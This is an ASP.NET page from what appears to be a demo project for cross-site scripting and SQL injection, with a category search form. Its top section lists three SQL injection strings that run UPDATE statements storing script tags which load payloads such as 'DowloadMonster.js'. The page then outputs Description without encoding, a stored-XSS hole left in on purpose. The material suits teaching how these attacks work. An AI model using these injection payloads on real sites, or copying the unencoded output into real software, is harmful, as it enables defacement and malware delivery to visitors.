<%@ Page Title="" Language="C#" MasterPageFile="~/Site.Master" AutoEventWireup="true" CodeBehind="Categories.aspx.cs" Inherits="WebApp.XSS_Demo.Categories" %>
<asp:Content ID="Content1" ContentPlaceHolderID="HeadContent" runat="server">
</asp:Content>
<asp:Content ID="Content2" ContentPlaceHolderID="MainContent" runat="server">
    <div>
        <div>
            SELECT * FROM Category WHERE Name LIKE '% %'
            UPDATE Category
            SET Description= '&lt;script src="http://localhost:1436/maliciousscript.js"&gt;&lt;/script&gt;' 
            WHERE CategoryID=1 --
        </div>
        <div>
            SELECT * FROM Category WHERE Name LIKE '%%'
            UPDATE Category
            SET Description= '&lt;script src="http://localhost:1436/IFrame.js"&gt;&lt;/script&gt;' 
            WHERE CategoryID=1 --
        </div>
        <div>
            SELECT * FROM Category WHERE Name LIKE '%%'
            UPDATE Category
            SET Description= '&lt;script src="http://localhost:1436/DowloadMonster.js"&gt;&lt;/script&gt;' WHERE CategoryID=2 --
        </div>
        <table>
            <tr>
                <td colspan="2">Tim kiem</td>
            </tr>
            <tr>
                <td>Name: </td>
                <td><asp:TextBox runat="server" ID="txtName" Width="700px"></asp:TextBox></td>
            </tr>
            <tr>
                <td>&nbsp;</td>
                <td><asp:Button runat="server" ID="btnSearch" Text="Search" 
                        onclick="btnSearch_Click" /></td>
            </tr>
        </table>
    </div>
    <table class="list">
    <tr>
        <th>Name</th>
        <th>Parent</th>
        <th>Is Active</th>
        <th>Descrition</th>            
        <th>ID</th>
    </tr>           
    <asp:Repeater runat="server" ID="repCategories" >
        <ItemTemplate>
            <tr <%#Container.ItemIndex%2 == 0? "class='even'":"" %>>                            
                <td>
                    <asp:LinkButton runat="server" ID="lnkUpdate" Text='<%#Eval("Name") %>' CommandName="edit" ToolTip="Update" ></asp:LinkButton>
                </td>
                <td><%#Eval("ParentID")%></td>
                <td><%#Eval("IsActive")%></td>
                <td><%#Eval("Description")%></td>
                <td class="id"><%#Eval("CategoryID")%></td>
            </tr>                             
        </ItemTemplate>                
    </asp:Repeater>
    </table>
    <div>
        <%--<script src="http://localhost:1436/DowloadMonster.js">            
        </script>--%>
    </div>
</asp:Content>
